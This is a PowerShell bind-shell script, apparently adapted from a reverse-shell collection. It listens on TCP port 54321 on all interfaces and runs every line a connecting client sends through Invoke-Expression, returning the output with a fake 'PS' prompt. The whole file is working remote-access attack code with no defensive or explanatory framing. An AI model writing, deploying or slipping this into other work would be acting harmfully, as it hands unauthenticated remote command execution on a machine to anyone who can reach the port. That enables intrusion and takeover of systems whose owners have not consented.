#Modified from source: https://gitbook.brainyou.stream/reverse-shells
function send-str($stream, [string]$str){
    $sendback = 'PS ' + (pwd).Path + '> ' + "$($str)";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
    ($stream).Write($sendbyte, 0, $sendbyte.Length);
    ($stream).Flush();
}
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 54321);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
send-str $stream "";
[byte[]]$bytes = 0..65535|%{0};
$data = "";
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    if(-not ($data.Contains("`n") -or $data.Contains("`r"))){ continue; }
    send-str $stream (Invoke-Expression "$($data)" 2>&1 | Out-String);
    $data = "";
}
$client.Close();
$listener.Stop();
